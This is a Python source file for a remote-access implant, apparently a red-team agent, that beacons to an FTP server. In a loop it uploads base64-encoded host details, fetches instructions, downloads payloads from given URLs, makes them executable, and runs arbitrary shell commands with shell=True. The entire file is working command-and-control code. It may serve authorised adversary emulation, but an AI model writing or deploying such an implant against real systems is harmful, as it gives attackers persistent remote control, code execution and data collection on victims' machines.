import argparse
import base64
import json
import os
import io
import socket
import subprocess
import stat
import sys
import time

import requests

from ftplib import FTP


class Executor:

    def run(self, i):
        i['pid'] = os.getpid()
        try:
            print('[*] Executing instruction (%s)' % i['pid'])
            if i['Executor'] == 'sh':
                i['Response'] = self.bash(i)
            i['Status'] = 0
        except Exception as e:
            i['Response'] = str(e)
            i['Status'] = 1

    @staticmethod
    def bash(request):
        try:
            return subprocess.check_output(request['Request'], shell=True, timeout=120).decode('utf-8', errors='ignore')
        except subprocess.CalledProcessError as e:
            raise Exception(e.output)


class Beacon:

    def __init__(self, host, user, password, jitter):
        self.ftp = FTP(host)
        self.ftp.login(user, password)
        self.jitter = jitter
        self.target = host
        self.links = []

    def monitor(self):
        while True:
            self.stor()
            self.retr()
            time.sleep(self.jitter)

    def stor(self):
        b = json.dumps(self._build_beacon('%s:21' % self.target, self.links))
        payload = base64.b64encode(b.encode())
        self.ftp.storlines('STOR %s.json' % socket.gethostname(), io.BytesIO(payload))
        self.links = []

    def retr(self):
        def handle(res):
            if res:
                instructions = json.loads(base64.b64decode(res))
                for i in instructions['links']:
                    try:
                        if i['Payload']:
                            self._download_payload(name=i['Payload'].split('/')[-1], location=i['Payload'])
                        Executor().run(i)
                    except Exception as e:
                        print('[-] Instruction failed: %s' % e)
                self.links.extend(instructions['links'])
        self.ftp.retrlines('RETR %s.json' % socket.gethostname(), handle)

    def _build_beacon(self, target, links=[]):
        return dict(
            Name=socket.gethostname(),
            Location=__file__,
            Platform=sys.platform,
            Executors=['sh'],
            Range='red',
            Pwd=os.getcwd(),
            Target=target,
            Links=links,
            Sleep=self.jitter
        )

    @staticmethod
    def _download_payload(name, location):
        r = requests.get(location)
        with open(name, 'w') as fh:
            fh.write(r.content.decode('utf-8'))
        os.chmod(name, stat.S_IXUSR ^ stat.S_IRUSR ^ stat.S_IWUSR ^ stat.S_IRGRP ^ stat.S_IWGRP)


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start agent')
    parser.add_argument('-A', '--address', required=False, default='127.0.0.1', help='IP of FTP server')
    parser.add_argument('-U', '--user', required=False, default='user', help='Username to auth')
    parser.add_argument('-P', '--password', required=False, default='password', help='Password to auth')
    parser.add_argument('-J', '--jitter', required=False, default=10)
    args = parser.parse_args()

    Beacon(args.address, args.user, args.password, int(args.jitter)).monitor()
